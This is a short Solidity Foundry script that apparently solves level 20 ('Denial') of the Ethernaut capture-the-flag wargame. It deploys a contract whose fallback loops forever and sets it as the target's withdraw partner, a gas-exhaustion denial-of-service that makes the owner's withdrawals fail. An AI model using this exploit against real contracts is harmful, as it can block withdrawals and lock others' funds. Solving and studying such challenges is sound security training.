// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/20-Denial/Denial.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract GasDos {
    // 利用循环实现攻击
    fallback() external payable {
        while(true){}
    }
}

contract Level20Solution is Script {
    Denial _denialInstance = Denial(payable(0x791034bFf32922f1098C390632ac7Fee31C82CD3));

    function run() public{
        vm.startBroadcast();

        console.log("owner balance : ", address(0xa9e).balance);

        GasDos _gasDosInstance = new GasDos();
        _denialInstance.setWithdrawPartner(address(_gasDosInstance));
        // _denialInstance.withdraw();

        console.log("owner balance : ", address(0xa9e).balance);
        vm.stopBroadcast();
    }
}